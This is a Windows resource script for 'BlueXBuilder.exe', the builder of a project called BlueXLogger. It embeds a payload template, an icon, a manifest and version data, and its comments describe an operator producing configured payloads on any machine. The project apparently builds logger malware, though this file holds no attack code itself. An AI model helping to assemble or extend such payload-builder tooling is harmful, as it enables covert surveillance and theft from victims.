/*============================================================================
 * BlueXLogger - res/builder.rc
 * Resources compiled into BlueXBuilder.exe.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Invoke rc.exe from the PROJECT ROOT (see res/payload.rc for the command).
 * The payload template must already exist at build/bin/BlueXLogger.exe; the
 * build script builds the payload first for exactly this reason.
 *==========================================================================*/
#include <windows.h>
#include "bxl_branding.h"
#include "bxl_resid.h"

/*--------------------------------------------------------------------------
 * Application icon (shared with the payload).
 *------------------------------------------------------------------------*/
BXL_RES_ICON ICON "res/bluexlogger.ico"

/*--------------------------------------------------------------------------
 * The unconfigured payload template.
 *
 * Embedding it is what makes BlueXBuilder.exe a single self-contained tool:
 * the operator can copy one EXE to any machine and produce configured
 * payloads without shipping (or even having) a compiler. The builder prefers
 * a payload_template.exe sitting next to it on disk when one is present, so
 * developers can iterate on the payload without rebuilding the builder.
 *------------------------------------------------------------------------*/
BXL_RES_TEMPLATE_NAME RCDATA "build/bin/BlueXLogger.exe"

/*--------------------------------------------------------------------------
 * About / watermark text shown by the About dialog and written into the
 * footer of every report the builder generates.
 *------------------------------------------------------------------------*/
BXL_RES_ABOUT_NAME RCDATA "res/about.txt"

/*--------------------------------------------------------------------------
 * Manifest: as-invoker, PerMonitorV2, comctl32 v6 (needed for themed child
 * controls). See res/builder.manifest.
 *------------------------------------------------------------------------*/
CREATEPROCESS_MANIFEST_RESOURCE_ID RT_MANIFEST "res/builder.manifest"

VS_VERSION_INFO VERSIONINFO
 FILEVERSION    BXL_VERSION_MAJOR,BXL_VERSION_MINOR,BXL_VERSION_PATCH,BXL_VERSION_BUILD
 PRODUCTVERSION BXL_VERSION_MAJOR,BXL_VERSION_MINOR,BXL_VERSION_PATCH,BXL_VERSION_BUILD
 FILEFLAGSMASK  0x3fL
#ifdef _DEBUG
 FILEFLAGS      0x1L
#else
 FILEFLAGS      0x0L
#endif
 FILEOS         0x40004L
 FILETYPE       0x1L
 FILESUBTYPE    0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      BXL_VENDOR
            VALUE "FileDescription",  "BlueXLogger graphical configuration builder"
            VALUE "FileVersion",      BXL_VERSION_STR
            VALUE "InternalName",     BXL_BUILDER_NAME
            VALUE "LegalCopyright",   BXL_COPYRIGHT
            VALUE "OriginalFilename", "BlueXBuilder.exe"
            VALUE "ProductName",      BXL_PRODUCT_NAME
            VALUE "ProductVersion",   BXL_VERSION_STR
            VALUE "Comments",         BXL_WATERMARK
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END
